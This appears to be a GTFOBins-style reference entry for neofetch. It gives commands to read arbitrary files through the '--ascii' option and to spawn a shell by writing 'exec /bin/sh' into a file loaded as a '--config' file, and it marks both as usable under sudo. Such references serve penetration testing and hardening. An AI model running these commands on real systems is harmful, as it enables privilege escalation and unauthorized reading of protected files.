---
type: gtfobin
name: neofetch
platform: Unix
functions: [file-read, shell]
tags: [gtfobin, unix, lotl]
---

# neofetch

## file-read

```bash
neofetch --ascii /path/to/input-file
```
_The file content is used as the logo while some other information is displayed on its right._
**Contexts:** sudo, unprivileged

## shell

```bash
echo 'exec /bin/sh' >/path/to/temp-file
neofetch --config /path/to/temp-file
```
**Contexts:** sudo, unprivileged
